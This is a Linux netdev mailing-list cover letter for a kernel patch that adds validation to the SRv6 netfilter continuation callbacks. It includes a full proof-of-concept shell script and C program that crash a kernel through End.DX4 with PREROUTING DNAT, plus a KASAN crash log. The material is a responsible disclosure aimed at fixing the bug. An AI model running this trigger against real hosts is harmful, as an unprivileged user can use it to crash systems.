Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.216.45
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1792826597;
	b=q3QTvd7Jo7/iXQCG1rGd9JSJ/h45ibCgUe/n6bVpOhP5CeBnQkvTZ20O8kGEjH4v/1Fc
	 GZKdmGWfUxQqjnfwWNvzwPYuFPYUUU3QfoEtDMnr8fff1+lFcADNkYjBcK6fyOfk58NWX
	 IiiBGaZB048ehMRR0n+wwzIcRz2Lmu4vrl7rACnWvCEPMNq5Zt7ZC5b+XmJzmpLFY+QDu
	 aHunr3Xvhk5oqqEx1DhklopqB3ckCmwrdSOqeueqtpCK5ZdN/M4EwNZM56eMWE38GdTKS
	 DiWlcAAmM2v5TBb54nYFq2ad6MoAF8bTbtW61d47LBmaVAO+btJ+feFXeURVIXT4A1A==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792826597;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:From:To:Cc:Subject:
	 Date:Message-ID:X-Mailer:MIME-Version:Content-Transfer-Encoding;
	bh=bleKjZE6IHkLwq/nvtFOY2UD38x0RwNe9NT2oBikTmE=;
	b=p/6oDNkAJt5Nfc3m3JzrEFMFS2oxUgLFRbWRo/DIKUHGBA7tSTn+pJwGDNBQZOh/Ky3C
	 Ux/XQSEGk6Rb/FXHPEUOP3QskXH7yg20hfti68XnBifVj844MXGj7b+qsK2xTeWyB0P6S
	 w0Eueb5g0p67DHtu7T/3Ka22SFpu75vWq82IXXAj2Orv/Zv9IQTZJBrekhNJdNDsu3Sz7
	 Xov+lpj9iwO+8ngUwz6F4S4tyf5qktXzCxK0yLi06Do9QNJ59mWbB9NSfcjbgwS0ttHCk
	 Pxk/o4a0cZi9RKQ2Id5UGZATVztQJFhuHu4+vMvRSfGndZ/l9nYtps506TbKt8bd24Q==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=EcdQgTke;
	arc=none smtp.remote-ip=209.85.216.45
Received: from mail-pj1-f45.google.com (mail-pj1-f45.google.com [209.85.216.45])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3C22F606A31A
	for <netdev@vger.kernel.org>; Sat, 24 Oct 2026 07:23:16 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 3C22F606A31A
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=EcdQgTke
Received: by mail-pj1-f45.google.com with SMTP id 98e67ed59e1d1-3ab60ff4273so1298239a91.0
        for <netdev@vger.kernel.org>; Sat, 24 Oct 2026 00:23:16 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1792826595; x=1793431395; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=bleKjZE6IHkLwq/nvtFOY2UD38x0RwNe9NT2oBikTmE=;
        b=EcdQgTke9pmJRoTGKxF9HhkAx69Av0AQ1lVQWG72GnspE/7it7K5aNTkNidgwiylS2
         8f16guBhnMYY3Ocbc0SeWmnOndCD4Plk/5ZUYb6+xtvDXSScEdj1n2nsxcBLUBq2Q7YT
         Pl3KX2ZzIfPnkJY72fg/JF0H62Dtiw3Q95it42C0Hw/z5WVKBEQjOSDvenkhwEnfub/S
         C4xIUziqZ5Djak82NoeOWDFcLRsoCnKSbJPPQUABQo1xEQdgP8l2muM0LJUjwYf8ig/W
         9JNm2Hs0LjJXjU2yB3b0DQeYyiaPezNKcxD9wflmtGUns6yamXsLbUsQGDz183FDDB6c
         wTKA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792826595; x=1793431395;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=bleKjZE6IHkLwq/nvtFOY2UD38x0RwNe9NT2oBikTmE=;
        b=2WnCdvwrhDCdXItDgmGkkF/nR+coMo8eKXvuMqHzG5RSNujpya4Y31XZwZFakqs4Dy
         QGH64I75F53QU42DbmiSAi/KEClz7E8dfLA4mISPz/vie0dymOrKEmQA5VLeboQalD5A
         KbWLFJ4EdiIQwnyVn33kxc1JHcl65M9pPc7JH3tEpwcuzskrWMIc/B4uQsrqRavfY4dN
         TZO4uPtv+nK8jJV8LdlHLn12j8O/761ffBu2CnVacrBIwJK0Yi95c/4W2TqIi4VPDYde
         40SZrzYRTeGEoBkoqzRinrwhtydjeDEdKRoHUIrGkz/kUouK0uTFBt4F9bf/wGaqMytW
         RFSw==
X-Gm-Message-State: AFq9FYJoU37NvKAn8UXSxOWegJIl+3rDulnP8mK6iodHBAtUfeqpd6Kk
	O7t5pxhDswNOGzobfXD9mppGzEN9if1svN/XFLeWLpwJ1sSt2kYNkGmo6UglrhfkKyhcyW2FQWC
	yeSAwfA==
X-Gm-Gg: AYBFou3Uig5uO+8Q7QmYtCuTUxjKfewIQlfdM/uOZLQ8/mSU3Qebj4hddR6FZLdUZKd
	lCoTOFbCVuc0uRaGZdO6YpfpcEOcDm8mzb5Iq6xnRcwN/Jzc1rjhBDnndc7j0uC1GntP5Knsh+2
	0U7NihAp0wnJwnEpC2O9RsmCyzANHxWLcHgAueRoBsVaj2O4xw9L4Dz8ABb0NObvlVIKM+h2OeJ
	XYOXqNQaVz4tEpKhCH3QvyWObubf9l/hVrpiKZvG9w0p3j3RpgtuVL5S5dVhhk5+QGdpW3tK9iS
	le5dVBTvsr1yjlh5MDeXAG0VqE7BlECjmhUF+EJeU7P6rKVtUUp+6vrXDXzPQ6txbmXxAcvwzAf
	jLEVTC3FMAJ/T3iJt0sTFRkrnh3z+DS0m+8Ul1gGW5XIc5ccvLkLeZvHVjwiarQ+QfeNT8hVq1H
	1Q6ooMuooGpZVLm8KVG0XVDCEN48WpbkcjWmJX1ofI8iCeF/EmNHt5kAm4MKtYGlBIEZgOagvz0
	J+kivr33ilriTScMT2O4WusMyPkzTQ60wyFXx6KxVL0l9s7U2YMgKQuWY45ubtQzWd6
X-Received: by 2002:a17:90b:3a08:b0:3ac:4e18:238e with SMTP id 98e67ed59e1d1-3adeaf98145mr1320814a91.46.1792826594961;
        Sat, 24 Oct 2026 00:23:14 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([219.141.235.82])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3adebb0639bsm1985167a91.12.2026.10.24.00.23.09
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 24 Oct 2026 00:23:14 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: netdev@vger.kernel.org,
	andrea.mayer@uniroma2.it
Cc: davem@davemloft.net,
	edumazet@kernel.org,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	contact@proelbtn.com,
	pablo@netfilter.org,
	vega@nebusec.ai,
	sashiko-bot@kernel.org,
	petalzu987@gmail.com,
	weir@nebusec.ai,
	liuhangbin@kylinos.cn
Subject: [PATCH net v3 0/1] seg6: validate state in netfilter continuations
Date: Sat, 24 Oct 2026 15:23:03 +0800
Message-ID: <cover.1792660496.git.petalzu987@gmail.com>
X-Mailer: git-send-email 2.53.0
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Post: <mailto:netdev@vger.kernel.org>
List-Help: <mailto:netdev+help@vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
List-Owner: <mailto:netdev+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zixuan Chai <petalzu987@gmail.com>

Hi Linux kernel maintainers,

Thanks for the review of v2. This revision moves destination-state
validation to the netfilter continuation callbacks, so packets that do
not traverse the hooks retain the original direct core path.

We found and validated a bug in the SRv6 netfilter continuations in
net/ipv6/seg6_local.c and net/ipv6/seg6_iptunnel.c. A hook can drop or
replace skb_dst() before an okfn resumes. The continuation must not
assume that the current destination still contains the expected
lwtstate.

This bug is tracked at:
https://bugtracker.nebusec.ai/f/11977

We provide the technical details and test summary below. The complete
archived PoC source and an exact excerpt from the clean serial log follow.

---- details below ----

Bug details:

When nf_hooks_lwtunnel is enabled, End.DX4 and End.DX6 pass the
decapsulated packet through NF_INET_PRE_ROUTING before their finish
callbacks resume. DNAT can drop skb_dst() during this hook. The
SEG6_LOCAL input continuation and seg6_iptunnel input/output
continuations have the same assumption after their respective hooks.

The patch validates skb_valid_dst(), a non-NULL lwtstate, and the
expected LWTUNNEL_ENCAP_SEG6_LOCAL or LWTUNNEL_ENCAP_SEG6 type in small
wrappers used only as NF_HOOK() okfn callbacks. Invalid state is
dropped. Direct calls when nf_hooks_lwtunnel is off remain unchanged.
The validation is by type, not state identity; it does not traverse
XFRM dsts or take an additional lwtstate reference.

Reproducer:

The guest lacked cc1. A static x86_64 executable was built from the
archived poc.c on the host, copied into the disposable QEMU guest, and
executed only in that guest. The End.DX4 trigger was run as test_user
in a fresh user/network namespace:

    su -s /bin/sh test_user -c \
        'cd /tmp/poc && unshare -Urn -- sh ./poc.sh dx4-inner'

The separate root-only XFRM trigger was run in a QEMU guest with eth0
configured as 10.0.2.15/24:

    cd /tmp/poc && sh ./poc.sh iptunnel-xfrm

Build and test environment:

Runtime tests used fresh QEMU TCG guests with 1 vCPU and 2 GiB RAM,
backed by the same base image.

------BEGIN poc.sh------
#!/bin/sh
set -eu

PATH=/usr/sbin:/usr/bin:/sbin:/bin${PATH:+:$PATH}

SELF=$(readlink -f "$0")
DIR=$(dirname "$SELF")
BIN="$DIR/poc"

DX4_TABLE=poc_seg6_dx4
DX4_ROUTE_TABLE=100
DX4_RULE_PREF=100
DX4_SID=fc00:12:100::6004
DX4_OLD_IPV4_FORWARD=
DX4_OLD_IPV6_FORWARD=
DX4_OLD_RP_FILTER=
DX4_SYSCTL_SAVED=0
DX4_SRC_PAIR_ADDED=0
DX4_HS_PAIR_ADDED=0
DX4_ROUTE_ADDED=0
DX4_RULE_ADDED=0
DX4_TABLE_ADDED=0

XFRM_TABLE=poc_seg6_iptunnel_xfrm
XFRM_IFACE=${POC_IFACE:-eth0}
XFRM_SOURCE_IP=${POC_SOURCE_IP:-10.0.2.15}
XFRM_SNAT_IP=${POC_SNAT_IP:-10.0.2.16}
XFRM_DST_IP=${POC_DST_IP:-198.18.0.2}
XFRM_SEGMENT=${POC_SEGMENT:-fec0::2}
XFRM_SPI=0x100
XFRM_AUTH_KEY=0x1111111111111111111111111111111111111111111111111111111111111111
XFRM_ENC_KEY=0x22222222222222222222222222222222
XFRM_ADDR_ADDED=0
XFRM_ADDR_PREFIX=
XFRM_IFACE_STATE_SAVED=0
XFRM_IFACE_WAS_UP=0
XFRM_SEGMENT_ROUTE_ADDED=0
XFRM_ENCAP_ROUTE_ADDED=0
XFRM_TABLE_ADDED=0
XFRM_STATE_ADDED=0
XFRM_POLICY_ADDED=0
XFRM_OLD_NF_HOOKS=
XFRM_NF_HOOKS_ENABLED=0

usage() {
	cat >&2 <<EOF
usage: $0 [namespace|dx4|root|iptunnel-xfrm]

  namespace       non-root End.DX4 + PREROUTING DNAT (default)
  dx4             root End.DX4 + PREROUTING DNAT
  root            compatibility alias for dx4
  iptunnel-xfrm   root-only QEMU test: SRv6 encap + SNAT + ESP/XFRM
EOF
}

need_cmd() {
	command -v "$1" >/dev/null 2>&1 || {
		echo "missing command: $1" >&2
		exit 1
	}
}

require_root() {
	[ "$(id -u)" -eq 0 ] || {
		echo "this mode must run as root inside a QEMU guest" >&2
		exit 1
	}
}

require_qemu_guest() {
	if [ ! -r /sys/class/dmi/id/sys_vendor ] || \
		! grep -qi qemu /sys/class/dmi/id/sys_vendor; then
		echo "iptunnel-xfrm may only run in a disposable QEMU guest" >&2
		exit 1
	fi
}

build_poc() {
	need_cmd cc
	cc -O2 -Wall -Wextra -o "$BIN" "$DIR/poc.c"
}

cleanup_dx4() {
	if [ "$DX4_RULE_ADDED" -eq 1 ]; then
		ip -6 rule del iif rt0 to "$DX4_SID/128" \
			lookup "$DX4_ROUTE_TABLE" pref "$DX4_RULE_PREF" 2>/dev/null || true
	fi
	if [ "$DX4_ROUTE_ADDED" -eq 1 ]; then
		ip -6 route del "$DX4_SID/128" table "$DX4_ROUTE_TABLE" \
			2>/dev/null || true
	fi
	if [ "$DX4_TABLE_ADDED" -eq 1 ]; then
		nft delete table ip "$DX4_TABLE" 2>/dev/null || true
	fi
	if [ "$DX4_SRC_PAIR_ADDED" -eq 1 ]; then
		ip link del src0 2>/dev/null || true
	fi
	if [ "$DX4_HS_PAIR_ADDED" -eq 1 ]; then
		ip link del hs0 2>/dev/null || true
	fi

	if [ "$DX4_SYSCTL_SAVED" -eq 1 ]; then
		sysctl -wq net.ipv4.ip_forward="$DX4_OLD_IPV4_FORWARD" || true
		sysctl -wq net.ipv6.conf.all.forwarding="$DX4_OLD_IPV6_FORWARD" || true
		sysctl -wq net.ipv4.conf.all.rp_filter="$DX4_OLD_RP_FILTER" || true
	fi
}

setup_and_trigger_dx4() {
	need_cmd ip
	need_cmd nft
	need_cmd sysctl

	for dev in src0 rt0 hs0 rth0; do
		if [ -e "/sys/class/net/$dev" ]; then
			echo "interface $dev already exists; use a fresh network namespace" >&2
			return 1
		fi
	done
	if nft list table ip "$DX4_TABLE" >/dev/null 2>&1 || \
		ip -6 route show table "$DX4_ROUTE_TABLE" "$DX4_SID/128" | grep -q . || \
		ip -6 rule show pref "$DX4_RULE_PREF" | grep -q .; then
		echo "End.DX4 PoC resources already exist; refusing to overwrite them" >&2
		return 1
	fi

	DX4_OLD_IPV4_FORWARD=$(sysctl -n net.ipv4.ip_forward)
	DX4_OLD_IPV6_FORWARD=$(sysctl -n net.ipv6.conf.all.forwarding)
	DX4_OLD_RP_FILTER=$(sysctl -n net.ipv4.conf.all.rp_filter)
	DX4_SYSCTL_SAVED=1

	ip link add src0 type veth peer name rt0
	DX4_SRC_PAIR_ADDED=1
	ip link add hs0 type veth peer name rth0
	DX4_HS_PAIR_ADDED=1

	ip link set lo up
	ip addr add 2001:11::1/64 dev src0 nodad
	ip addr add 10.0.0.22/24 dev rth0

	ip link set src0 up
	ip link set rt0 up
	ip link set hs0 up
	ip link set rth0 up

	sysctl -wq net.ipv4.ip_forward=1
	sysctl -wq net.ipv6.conf.all.forwarding=1
	sysctl -wq net.netfilter.nf_hooks_lwtunnel=1
	sysctl -wq net.ipv4.conf.all.rp_filter=0

	ip -6 route add "$DX4_SID/128" table "$DX4_ROUTE_TABLE" \
		encap seg6local action End.DX4 nh4 10.0.0.2 dev rth0
	DX4_ROUTE_ADDED=1
	ip -6 rule add iif rt0 to "$DX4_SID/128" \
		lookup "$DX4_ROUTE_TABLE" pref "$DX4_RULE_PREF"
	DX4_RULE_ADDED=1

	nft add table ip "$DX4_TABLE"
	DX4_TABLE_ADDED=1
	nft add chain ip "$DX4_TABLE" prerouting \
		'{ type nat hook prerouting priority -100; policy accept; }'
	nft add rule ip "$DX4_TABLE" prerouting \
		ip daddr 10.0.0.2 dnat to 10.0.0.99

	# Keep the trap active so all objects created above are removed on return.
	"$BIN" src0 rt0
}

cleanup_iptunnel_xfrm() {
	if [ "$XFRM_POLICY_ADDED" -eq 1 ]; then
		ip xfrm policy delete dir out src "$XFRM_SNAT_IP/32" \
			dst "$XFRM_DST_IP/32" 2>/dev/null || true
	fi
	if [ "$XFRM_STATE_ADDED" -eq 1 ]; then
		ip xfrm state delete src "$XFRM_SNAT_IP" dst "$XFRM_DST_IP" \
			proto esp spi "$XFRM_SPI" 2>/dev/null || true
	fi

	if [ "$XFRM_ENCAP_ROUTE_ADDED" -eq 1 ]; then
		ip -4 route del "$XFRM_DST_IP/32" 2>/dev/null || true
	fi
	if [ "$XFRM_SEGMENT_ROUTE_ADDED" -eq 1 ]; then
		ip -6 route del "$XFRM_SEGMENT/128" dev "$XFRM_IFACE" \
			2>/dev/null || true
	fi
	if [ "$XFRM_ADDR_ADDED" -eq 1 ]; then
		ip addr del "$XFRM_SNAT_IP/$XFRM_ADDR_PREFIX" dev "$XFRM_IFACE" \
			2>/dev/null || true
	fi
	if [ "$XFRM_TABLE_ADDED" -eq 1 ]; then
		nft delete table ip "$XFRM_TABLE" 2>/dev/null || true
	fi
	if [ "$XFRM_IFACE_STATE_SAVED" -eq 1 ] && \
		[ "$XFRM_IFACE_WAS_UP" -eq 0 ]; then
		ip link set "$XFRM_IFACE" down 2>/dev/null || true
	fi
	if [ "$XFRM_NF_HOOKS_ENABLED" -eq 1 ] && \
		[ "$XFRM_OLD_NF_HOOKS" -eq 0 ]; then
		echo "NOTE: nf_hooks_lwtunnel is one-way enabled until the guest reboots" >&2
	fi
}

setup_and_trigger_iptunnel_xfrm() {
	require_root
	require_qemu_guest
	need_cmd ip
	need_cmd nft
	need_cmd ping
	need_cmd sysctl

	[ -e "/sys/class/net/$XFRM_IFACE" ] || {
		echo "interface $XFRM_IFACE is required" >&2
		exit 1
	}
	XFRM_SOURCE_CIDR=$(ip -4 -o addr show dev "$XFRM_IFACE" | \
		awk -v address="$XFRM_SOURCE_IP" \
			'index($4, address "/") == 1 { print $4; exit }')
	if [ -z "$XFRM_SOURCE_CIDR" ]; then
		echo "$XFRM_IFACE must have $XFRM_SOURCE_IP configured" >&2
		exit 1
	fi
	XFRM_ADDR_PREFIX=${XFRM_SOURCE_CIDR#*/}

	if nft list table ip "$XFRM_TABLE" >/dev/null 2>&1 || \
		ip -4 route show "$XFRM_DST_IP/32" | grep -q . || \
		ip -6 route show "$XFRM_SEGMENT/128" | grep -q . || \
		ip xfrm state list src "$XFRM_SNAT_IP" dst "$XFRM_DST_IP" \
			| grep -q . || \
		ip xfrm policy list src "$XFRM_SNAT_IP/32" \
			dst "$XFRM_DST_IP/32" dir out | grep -q .; then
		echo "XFRM PoC table or route already exists; refusing to overwrite it" >&2
		return 1
	fi

	if ip -o link show dev "$XFRM_IFACE" | grep -q '<[^>]*UP'; then
		XFRM_IFACE_WAS_UP=1
	fi
	XFRM_IFACE_STATE_SAVED=1
	ip link set "$XFRM_IFACE" up

	XFRM_OLD_NF_HOOKS=$(sysctl -n net.netfilter.nf_hooks_lwtunnel)
	case "$XFRM_OLD_NF_HOOKS" in
	0|1) ;;
	*)
		echo "unexpected nf_hooks_lwtunnel value: $XFRM_OLD_NF_HOOKS" >&2
		return 1
		;;
	esac

	if ! ip -4 -o addr show dev "$XFRM_IFACE" | \
		grep -Fq "inet $XFRM_SNAT_IP/"; then
		ip addr add "$XFRM_SNAT_IP/$XFRM_ADDR_PREFIX" dev "$XFRM_IFACE"
		XFRM_ADDR_ADDED=1
	fi

	ip -6 route add "$XFRM_SEGMENT/128" dev "$XFRM_IFACE"
	XFRM_SEGMENT_ROUTE_ADDED=1
	ip -4 route add "$XFRM_DST_IP/32" \
		encap seg6 mode encap segs "$XFRM_SEGMENT" dev "$XFRM_IFACE"
	XFRM_ENCAP_ROUTE_ADDED=1

	# Use a private table; never flush the guest's global nftables ruleset.
	nft add table ip "$XFRM_TABLE"
	XFRM_TABLE_ADDED=1
	nft add chain ip "$XFRM_TABLE" postrouting \
		'{ type nat hook postrouting priority 100; policy accept; }'
	nft add rule ip "$XFRM_TABLE" postrouting \
		ip saddr "$XFRM_SOURCE_IP" ip daddr "$XFRM_DST_IP" \
		snat to "$XFRM_SNAT_IP"

	ip xfrm state add \
		src "$XFRM_SNAT_IP" dst "$XFRM_DST_IP" \
		proto esp spi "$XFRM_SPI" mode transport \
		auth-trunc 'hmac(sha256)' "$XFRM_AUTH_KEY" 128 \
		enc 'cbc(aes)' "$XFRM_ENC_KEY"
	XFRM_STATE_ADDED=1
	ip xfrm policy add dir out \
		src "$XFRM_SNAT_IP/32" dst "$XFRM_DST_IP/32" \
		tmpl src "$XFRM_SNAT_IP" dst "$XFRM_DST_IP" \
		proto esp mode transport
	XFRM_POLICY_ADDED=1

	ip -4 route get "$XFRM_DST_IP" from "$XFRM_SOURCE_IP"
	ip xfrm policy list
	if [ "$XFRM_OLD_NF_HOOKS" -eq 0 ]; then
		echo "WARNING: enabling nf_hooks_lwtunnel persists until QEMU guest reboot" >&2
	fi
	sysctl -wq net.netfilter.nf_hooks_lwtunnel=1
	XFRM_NF_HOOKS_ENABLED=1

	# The target need not answer; transmitting this packet enters the path.
	echo "Sending one IPv4 ping to trigger SRv6 encap + POST_ROUTING SNAT + ESP"
	if ping -n -c 1 -W 1 -I "$XFRM_SOURCE_IP" "$XFRM_DST_IP"; then
		echo "ping received a reply"
	else
		ping_status=$?
		case "$ping_status" in
		1)
			echo "no ping reply (expected); inspect the QEMU serial log for the kernel result"
			;;
		*)
			echo "ping failed before the trigger completed (status $ping_status)" >&2
			return "$ping_status"
			;;
		esac
	fi
}

case "${1:-namespace}" in
namespace)
	build_poc
	exec unshare -Urn -- "$SELF" dx4-inner
	;;
dx4|root)
	require_root
	trap cleanup_dx4 EXIT
	build_poc
	setup_and_trigger_dx4
	;;
dx4-inner|inner)
	trap cleanup_dx4 EXIT
	setup_and_trigger_dx4
	;;
iptunnel-xfrm|xfrm)
	trap cleanup_iptunnel_xfrm EXIT
	trap 'exit 129' HUP
	trap 'exit 130' INT
	trap 'exit 143' TERM
	setup_and_trigger_iptunnel_xfrm
	;;
*)
	usage
	exit 2
	;;
esac
------END poc.sh------

------BEGIN poc.c------
#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/icmp6.h>
#include <netinet/ip.h>
#include <netinet/ip6.h>
#include <netinet/udp.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

static uint16_t checksum(const void *data, size_t len)
{
	const uint8_t *bytes = data;
	uint32_t sum = 0;
	size_t i;

	for (i = 0; i + 1 < len; i += 2)
		sum += ((uint32_t)bytes[i] << 8) | bytes[i + 1];

	if (len & 1)
		sum += (uint32_t)bytes[len - 1] << 8;

	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);

	return (uint16_t)~sum;
}

static void die(const char *msg)
{
	perror(msg);
	exit(1);
}

static void get_if_hwaddr(int fd, const char *ifname, unsigned char *mac)
{
	struct ifreq ifr = {0};

	strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die("SIOCGIFHWADDR");

	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
}

static int get_ifindex(int fd, const char *ifname)
{
	struct ifreq ifr = {0};

	strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die("SIOCGIFINDEX");

	return ifr.ifr_ifindex;
}

int main(int argc, char **argv)
{
	static const char payload[] = "dx4";
	struct sockaddr_ll sll = {0};
	struct ether_header *eth;
	struct ip6_hdr *ip6;
	struct iphdr *ip4;
	struct udphdr *udp;
	unsigned char src_mac[ETH_ALEN];
	unsigned char dst_mac[ETH_ALEN];
	unsigned char frame[sizeof(*eth) + sizeof(*ip6) + sizeof(*ip4) +
			    sizeof(*udp) + sizeof(payload)];
	const char *tx_if;
	const char *peer_if;
	size_t off;
	int fd;

	if (argc != 3) {
		fprintf(stderr, "usage: %s <tx-if> <peer-if>\n", argv[0]);
		return 2;
	}

	tx_if = argv[1];
	peer_if = argv[2];

	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IPV6));
	if (fd < 0)
		die("socket(AF_PACKET)");

	get_if_hwaddr(fd, tx_if, src_mac);
	get_if_hwaddr(fd, peer_if, dst_mac);

	memset(frame, 0, sizeof(frame));
	off = 0;

	eth = (struct ether_header *)(frame + off);
	memcpy(eth->ether_shost, src_mac, ETH_ALEN);
	memcpy(eth->ether_dhost, dst_mac, ETH_ALEN);
	eth->ether_type = htons(ETH_P_IPV6);
	off += sizeof(*eth);

	ip6 = (struct ip6_hdr *)(frame + off);
	ip6->ip6_flow = htonl(6U << 28);
	ip6->ip6_plen = htons(sizeof(*ip4) + sizeof(*udp) + sizeof(payload));
	ip6->ip6_nxt = IPPROTO_IPIP;
	ip6->ip6_hops = 64;
	if (inet_pton(AF_INET6, "2001:11::1", &ip6->ip6_src) != 1)
		die("inet_pton outer src");
	if (inet_pton(AF_INET6, "fc00:12:100::6004", &ip6->ip6_dst) != 1)
		die("inet_pton outer dst");
	off += sizeof(*ip6);

	ip4 = (struct iphdr *)(frame + off);
	ip4->version = 4;
	ip4->ihl = 5;
	ip4->ttl = 64;
	ip4->protocol = IPPROTO_UDP;
	ip4->tot_len = htons(sizeof(*ip4) + sizeof(*udp) + sizeof(payload));
	ip4->saddr = inet_addr("10.0.0.1");
	ip4->daddr = inet_addr("10.0.0.2");
	ip4->check = checksum(ip4, sizeof(*ip4));
	off += sizeof(*ip4);

	udp = (struct udphdr *)(frame + off);
	udp->source = htons(4442);
	udp->dest = htons(5555);
	udp->len = htons(sizeof(*udp) + sizeof(payload));
	udp->check = 0;
	off += sizeof(*udp);

	memcpy(frame + off, payload, sizeof(payload));

	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_IPV6);
	sll.sll_ifindex = get_ifindex(fd, tx_if);
	sll.sll_halen = ETH_ALEN;
	memcpy(sll.sll_addr, dst_mac, ETH_ALEN);

	if (sendto(fd, frame, sizeof(frame), 0, (struct sockaddr *)&sll,
		   sizeof(sll)) < 0)
		die("sendto");

	close(fd);
	return 0;
}
------END poc.c------

The crash excerpts are copied from the serial logs from the first Oops
through the reboot line; the preceding interactive shell prompt and
terminal control bytes are omitted.

----BEGIN End.DX4 crash log----
[  678.521914][    C0] Oops: general protection fault, probably for non-canonical address 0xdffffc0000000011: 0000 [#1] SMP KASAN NOPTI
[  678.524426][    C0] KASAN: null-ptr-deref in range [0x0000000000000088-0x000000000000008f]
[  678.526649][    C0] CPU: 0 UID: 1001 PID: 5145 Comm: poc Not tainted 7.3.0-rc7-00196-gf4377bf85887 #2 PREEMPT(full) 
[  678.528588][    C0] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[  678.530432][    C0] RIP: 0010:input_action_end_dx4_finish+0x7b/0x570
[  678.533076][    C0] Code: 0f 85 91 02 00 00 e8 94 d9 64 f7 49 89 df 48 b8 00 00 00 00 00 fc ff df 49 83 e7 fe 49 8d bf 88 00 00 00 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 81 04 00 00 48 8d bd d0 00 00 00 4d 8b b7 88 00
[  678.535859][    C0] RSP: 0018:ffa0000000007888 EFLAGS: 00000206
[  678.537547][    C0] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000101
[  678.539110][    C0] RDX: 0000000000000011 RSI: ffffffff8a5d531c RDI: 0000000000000088
[  678.540601][    C0] RBP: ff110000301de500 R08: 0000000000000101 R09: ffe21c00064c830c
[  678.542112][    C0] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000
[  678.543585][    C0] R13: ff110000301de558 R14: 0000000000000000 R15: 0000000000000000
[  678.545146][    C0] FS:  0000000020e713c0(0000) GS:ff110000d566e000(0000) knlGS:0000000000000000
[  678.546755][    C0] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  678.548090][    C0] CR2: 000000000049bfe0 CR3: 0000000022296000 CR4: 00000000007516f0
[  678.549909][    C0] PKRU: 55555554
[  678.550995][    C0] Call Trace:
[  678.552149][    C0]  <IRQ>
[  678.553352][    C0]  input_action_end_dx4+0x35d/0x470
[  678.554819][    C0]  seg6_local_input_core+0x106/0x330
[  678.556171][    C0]  seg6_local_input+0x17c/0x1e0
[  678.557469][    C0]  lwtunnel_input+0x304/0x770
[  678.558752][    C0]  ? __pfx_lwtunnel_input+0x10/0x10
[  678.560053][    C0]  ipv6_rcv+0x365/0x3d0
[  678.561234][    C0]  ? __pfx_ipv6_rcv+0x10/0x10
[  678.562502][    C0]  deliver_skb+0x179/0x260
[  678.563785][    C0]  __netif_receive_skb_core.constprop.0+0x1560/0x32c0
[  678.565305][    C0]  ? lock_acquire+0x1bf/0x370
[  678.566550][    C0]  ? __pfx___netif_receive_skb_core.constprop.0+0x10/0x10
[  678.568054][    C0]  ? notifier_call_chain+0xbd/0x430
[  678.569380][    C0]  ? find_held_lock+0x2b/0x80
[  678.570655][    C0]  ? __lock_acquire+0x509/0x2110
[  678.571953][    C0]  __netif_receive_skb_one_core+0xaf/0x1e0
